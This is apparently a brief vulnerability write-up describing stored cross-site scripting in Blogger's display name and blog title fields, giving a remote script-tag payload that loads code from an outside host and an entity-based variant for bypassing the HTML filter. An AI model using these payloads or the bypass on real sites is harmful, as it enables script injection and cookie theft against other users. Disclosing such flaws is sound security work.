Blog input boxes
------------------------------------------

XSS vuln via Display name input box.

Blogger doesnt properally sanatize user input before generating it. For example, you can't use illegal characters in your username,or password, but for a "Display name", theyre allowed. Also, in Blog title, you can use them.

For a PoC in the display name box try putting:
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

When you visit your blog at http://whatever.blogspot.com, you'll see the code printedon the page, however it works. If you were to use a img tag as your display name, the image would be displayed.


And to bypass the not allowed html filter, we put the numerical equivlent of < before the actual tag, as well as &gt; after the tag

<&lt;SCRIPT SRC=http://ha.ckers.org/xss.js>&gt;

With that code above you'll notice your cookie data has popped up. Awesome huh? Below the screenshot & cookie data:
